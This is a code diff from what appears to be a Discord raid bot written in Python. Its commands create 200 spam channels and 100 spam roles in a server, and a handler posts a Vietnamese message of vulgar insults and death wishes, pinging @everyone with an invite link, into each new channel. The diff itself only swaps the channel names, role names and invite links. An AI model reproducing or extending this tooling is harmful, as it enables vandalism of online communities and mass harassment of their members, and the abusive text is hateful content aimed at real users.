@@ -107,7 +107,7 @@ async def spamch(ctx):
     if ctx.author.id:
         a = 1
         while a < 200:
-            await ctx.guild.create_text_channel("lasthopeonthetop")
+            await ctx.guild.create_text_channel("Oc c")
             print(f"{a} channels created")
             a += 1
     else:
@@ -120,7 +120,7 @@ async def spamrole(ctx):
     if ctx.author.id:
         a = 1
         while a < 100:
-            await ctx.guild.create_role(name='Hi')
+            await ctx.guild.create_role(name='ET')
             print(f"Tạo thành công {a}")
             a += 1
     else:
@@ -210,7 +210,7 @@ async def on_ready():
 
 @client.event 
 async def on_guild_channel_create(channel):
-    msg = """lũ óc cặc  , ngu như mẹ mày vậy , chết con mẹ mày đi , setup như lồn mẹ m @everyone https://discord.gg/wKukuY2J
+    msg = """lũ óc cặc  , ngu như mẹ mày vậy , chết con mẹ mày đi , setup như lồn mẹ m @everyone https://discord.gg/mccm
 
     """
     a = 1
